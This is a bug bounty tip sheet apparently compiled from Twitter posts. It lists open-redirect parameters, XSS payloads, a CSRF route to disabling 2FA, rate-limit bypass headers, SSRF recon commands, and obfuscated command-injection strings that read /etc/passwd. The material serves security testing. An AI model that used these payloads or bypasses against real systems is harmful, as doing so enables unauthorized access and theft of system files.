# Bug Bounty Tips from Twitter
This is a collection of Bug Bounty Tips collected from infosec professionals / bug hunters on twitter.

* Also a [Curated list of Bug Bounty Writeups](https://github.com/devanshbatham/Awesome-Bugbounty-Writeups)
***

## SMTP server takeover
```
1. Visit target.com
2. Masscan on target.com
3. Get SMTP(25) port open
4. Run netcat
    nc -v <ip><port>
```

**Observations:**
* The only exploitable thing is if the SMTP server allows unauthenticated emails being sent, as that an attacker could use the company SMTP server to send spam/junk mails. and probably will be a P3 or P4, or a nice informative because its a grey area bug.

***

## 25 Open Redirect Dorks 

```javascript
/{payload}
?next={payload}
?target={payload}
?rurl={payload}
?dest={payload}
?destination={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
/redirect/{payload}
/cgi-bin/redirect.cgi?{payload}
/out/{payload}
/out?{payload}
?view={payload}
/login?to={payload}
?image_url={payload}
?go={payload}
?return={payload}
?returnTo={payload}
?return_to={payload}
?checkout_url={payload}
?continue={pay load}
?return_path={payload}
```

***

## XSS Payloads

```html
#><img src=x onerror=alert()>.jpg
```
***

## XSS Email User Input 
* The email: test@test.com is being reflected
* But its required "@" in the email field
* Following up the [Brutelogic explanation](https://brutelogic.com.br/blog/xss-limited-input-formats/) for limited input formats
* **The Payload tested in this case:**
```html
“<svg/onload=alert(1)>”@x.y 
```
**Observations:**


* [Medium post source](https://medium.com/bugbountywriteup/reflected-user-input-xss-c3e681710e74)
***

## Bypassing 2FA with CSRF (abusing the 2FA functionality)

> 1) Create 2 accounts on target.com
> 2) Turn on 2FA in both accounts
> 3) Click on disable 2FA for any of the account and capture it in burp
> 4) Close the tab for first account and stay loggend in on 2nd account
> 5) Simply submit the CSRF PoC in a new tab
> 6) See if the 2FA is disabled in the 2nd account

***

## Bypassing Rate Limit on Header

```http
Add header/s with request:

X-Originating-IP: IP
X-Forwarded-For: IP
X-Remote-IP: IP
X-Remote-Addr: IP
X-Client-IP: IP
X-Host: IP
X-Forwared-Host: IP
```
**Observations:**
* This only works, if the load balancer does not discard these headers before passing the request. Whenver they do not discard them but rely on them it is a security mistake. Also try like local addresses such as 127.0.0.1 to see if it yields extra data in the response

***

## SSRF using assetfinder & waybackurls
* Find API links in subdomains
```bash
assetfinder --subs-only http://target.com | waybackurls | grep "?url="
```
Tools from @tomnomnom
* [assetfinder](https://github.com/tomnomnom/assetfinder)
* [waybackurls](https://github.com/tomnomnom/waybackurls)

***

## Comand Injection - Filter Bypass

```console
cat /etc/passwd
cat /e"t"c/pa"s"swd
cat /'e'tc/pa's' swd
cat /etc/pa??wd
cat /etc/pa*wd
cat /et' 'c/passw' 'd
cat /et$()c/pa$()$swd
cat /et${neko}c/pas${poi} swd
{cat,/etc/passwd} 
*echo "dwssap/cte/ tac" | rev
$(echo Y2FOIC9ldGMvcGFzc3dkCg== base64 -d)
w\ho\am\i
/\b\i\n/////s\h
who$@ami
xyz%0Acat%20/etc/passwd
IFS=,;`cat<<<uname,-a`
/???/??t /???/p??s??
test=/ehhh/hmtc/pahhh/hmsswd
cat ${test//hhh\/hm/}
cat ${test//hh??hm/}
```